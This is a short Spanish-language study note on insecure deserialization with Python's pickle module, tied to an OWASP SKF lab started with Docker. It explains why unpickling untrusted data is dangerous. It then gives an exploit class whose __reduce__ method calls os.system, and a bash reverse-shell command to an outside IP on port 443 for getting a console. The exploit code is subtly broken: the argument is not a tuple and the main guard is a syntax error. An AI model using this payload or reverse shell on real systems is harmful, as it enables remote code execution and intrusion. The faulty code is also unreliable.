> En Python, el módulo pickle funciona como un contenedor para tu código: te permite guardar objetos complejos, como listas, modelos o clases personalizadas, y recuperarlos posteriormente tal como estaban. Este proceso se denomina pickle (guardado) y unpickling (carga). Es útil para preservar el estado de un programa, pero tiene un inconveniente: el unpickling puede ejecutar código oculto en el archivo, lo que lo hace peligroso si se utiliza con datos de fuentes no confiables.

## Laboratorio
- [[skf-labs]] - des-pickle
	- `docker pull blabal1337/owasp-skf-lab:des-pickle`
	- `docker run -dit -p 127.0.0.1:5000:5000 blabal1337/owasp-skf-lab:des-pickle`

## Ataque
```
import pickle
import os
import binascii

class Exploit(object):
	def __reduce__(self):
		return (os.system, ('id'))

if __name__:"__main__":
	print(binascii.hexlify(pickle.dumps(Exploit())))
```
- Cambiamos el comando a `bash -c "bash -i >& /dev/tcp/172.19.136.109/443 1>&2"`
- Y nos ponemos en escucha antes de enviar el binario para ganar acceso a la consola.